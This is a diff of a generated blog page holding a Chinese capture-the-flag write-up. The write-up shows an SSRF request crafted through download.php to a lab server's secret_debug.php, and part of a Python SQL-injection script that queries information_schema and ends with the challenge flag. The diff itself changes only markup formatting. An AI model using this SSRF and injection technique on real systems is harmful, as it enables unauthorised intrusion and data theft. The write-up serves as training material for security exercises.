@@ -55,9 +55,9 @@
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
-<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.2.0">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="花城" type="application/atom+xml">
+
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="alternate" href="/atom.xml" title="花城" type="application/atom+xml">
 </head>
 
 
@@ -742,13 +742,14 @@
 <p>到这里就无头绪了，wp大法，利用<code>download.php</code>传参进行<code>ssrf</code>攻击</p>
 <p>虽然只能下载<code>pdf</code>文件，但是下载一个不存在的文件的时候<code>readfile</code>函数还是会执行的。</p>
 <p>根据<code>secret</code>参数带入<code>secret_debug</code>构造请求</p>
-<p><code>http://111.200.241.244:64242/secret/secret_debug.php？s=3&amp;txtfirst_name=a&amp;txtmiddle_name=b&amp;txtlast_name=c&amp;txtname_suffix=d&amp;txtdob=01/05/2000&amp;txtdl_nmbr=1234&amp;txtretypedl=1234</code></p>
+<p><code>http://111.200.241.244:64242/secret/secret_debug.php？s=3&amp;txtfirst_name=a&amp;txtmiddle_name=b&amp;txtlast_name=c&amp;txtname_suffix=d
+&amp;txtdob=01/05/2000&amp;txtdl_nmbr=1234&amp;txtretypedl=1234</code></p>
 <p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/img_convert/09587a8395c0263a1bae9cceaa078662.png#pic_center" alt=""></p>
 <p>发现<code>.pdf</code>加在了<code>s=3</code>后面，&amp;符号导致，所以进行<code>url</code>编码，服务器再解码，<code>.pdf</code>就会加到所有参数最后</p>
 <p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/img_convert/14b0246f279c125f3a41fd77384ae94b.png#pic_center" alt=""></p>
 <p>还是有问题，<code>.pdf</code>加在最后一个参数后面会影响其值，所以在参数后面再加一个&amp;，相当于隔断了<code>pdf</code></p>
 <p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/img_convert/057f4dc3fc2700e2819ca4679365972b.png#pic_center" alt=""></p>
-<p>注册成功。。注册的参数可以进行<code>sql注入</code>，大神的脚本：</p>
+<p>注册成功。。注册的参数可以进行<code>sql注入</code>，大神的脚本</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
 <span class="token keyword">import</span> random
 <span class="token keyword">import</span> urllib
@@ -762,7 +763,7 @@ url <span class="token operator">=</span> <span class="token string">' http://11
  <span class="token comment"># subquery = "select group_concat(column_name) from information_schema.columns where table_name='cetcYssrf'"</span>
  <span class="token comment"># secretName,value</span>
  <span class="token comment"># subquery = "select secretName from cetcYssrf LIMIT 1"</span>
- <span class="token comment"># secretname -&gt; flag</span>
+<span class="token comment"># secretname -&gt; flag</span>
 subquery <span class="token operator">=</span> <span class="token string">"select value from cetcYssrf LIMIT 1"</span>
  <span class="token comment"># value -&gt; flag{cpg9ssnu_OOOOe333eetc_2018}</span>
 
